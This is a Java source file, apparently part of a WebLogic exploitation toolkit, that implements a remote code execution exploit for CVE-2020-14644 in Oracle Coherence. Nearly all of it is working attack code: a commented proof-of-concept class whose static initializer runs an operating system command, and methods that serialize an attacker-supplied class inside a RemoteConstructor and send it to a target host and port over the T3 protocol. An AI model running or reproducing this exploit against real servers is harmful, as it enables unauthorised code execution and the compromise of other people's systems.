package org.weblogic.exploit;

import com.tangosol.internal.util.invoke.ClassDefinition;
import com.tangosol.internal.util.invoke.ClassIdentity;
import com.tangosol.internal.util.invoke.RemoteConstructor;
import com.tangosol.internal.util.invoke.lambda.LambdaIdentity;
import org.weblogic.exploit.annotation.Gadget;
import org.weblogic.serial.Serializer;
import org.weblogic.weblogic.T3ProtocolOperation;

import java.io.File;
import java.nio.file.Files;

//CVE-2020-14644
/*
Class name depends on weblogic version
Weblogic 12.2.1.3: LambdaIdentity$E12ECA49F06D0401A9D406B2DCC7463A
Weblogic 12.2.1.4: LambdaIdentity$423B02C050017B24DB10DFF759AA56BF
//
package com.tangosol.internal.util.invoke.lambda;
import java.io.IOException;

public class LambdaIdentity$423B02C050017B24DB10DFF759AA56BF {

    public LambdaIdentity$423B02C050017B24DB10DFF759AA56BF() {
    }

    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException var1) {
            var1.printStackTrace();
        }
    }
}

//
Weblogic 12.2.1.3: LambdaIdentity$E12ECA49F06D0401A9D406B2DCC7463A
Weblogic 12.2.1.3: LambdaIdentity$423B02C050017B24DB10DFF759AA56BF
javac LambdaIdentity$423B02C050017B24DB10DFF759AA56BF.java

 */
@Gadget(cve = "CVE-2020-14644", command = "/path/to/exploit.class", osCommand = false, description = "Ref: https://www.codetd.com/en/article/11892503")
public class Coherence5 implements Exploit {

    public Object exploit(final String command) throws Exception {
        byte[] bytes = Files.readAllBytes(new File(command).toPath());
        RemoteConstructor constructor = new RemoteConstructor(
                new ClassDefinition(new ClassIdentity(LambdaIdentity.class), bytes), new Object[]{}
        );
        return constructor;
    }

    @Override
    public void exploit(String host, String port, String command) throws Exception {
        byte[] bytes = Files.readAllBytes(new File(command).toPath());
        RemoteConstructor constructor = new RemoteConstructor(
                new ClassDefinition(new ClassIdentity(LambdaIdentity.class), bytes), new Object[]{}
        );
        T3ProtocolOperation.send(host, port, Serializer.serialize(constructor));
    }
}
